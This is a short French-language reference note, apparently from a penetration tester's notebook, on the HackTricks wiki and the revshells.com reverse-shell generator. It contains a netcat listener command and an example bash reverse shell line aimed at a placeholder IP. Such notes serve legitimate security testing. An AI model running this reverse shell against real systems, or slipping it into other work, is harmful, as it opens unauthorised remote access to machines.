---
titre: "HackTricks & revshells"
tags: [Outils, référence, méthodologie, reverse-shell]
source: https://book.hacktricks.wiki/
---

# HackTricks & revshells

Deux références « à garder ouvertes » pendant un test.

## HackTricks
**[book.hacktricks.wiki](https://book.hacktricks.wiki/)** (ex-.xyz) : wiki
encyclopédique organisé par **phase** et par **service/port**. Pour chaque port
(21, 80, 445, 1433, 5985…) : méthodo d'énumération et d'exploitation. Sections
privesc **Linux** et **Windows** extrêmement complètes.
- Réflexe : `nmap` révèle un port → ouvrir la page HackTricks du service
  correspondant → dérouler la checklist.

## revshells.com
**[revshells.com](https://www.revshells.com/)** : générateur de **reverse shells**.
On saisit son IP + port, on choisit le type (bash, nc, python, PowerShell, PHP…),
il génère la commande **et** l'encodage (URL, base64) prêts à coller.
```bash
# côté attaquant : listener
nc -lvnp 4444
# côté cible : coller la ligne générée (ex. bash -i >& /dev/tcp/IP/4444 0>&1)
```
Astuce : cocher **« Listener »** pour obtenir aussi la commande d'écoute, et
utiliser un `rlwrap`/upgrade PTY pour un shell confortable.

## Réflexe
HackTricks = *quoi tester* ; revshells = *comment récupérer un shell*. Pour les
payloads par faille : [[PayloadsAllTheThings]] ; pour la privesc par binaire :
[[GTFOBins & LOLBAS]].
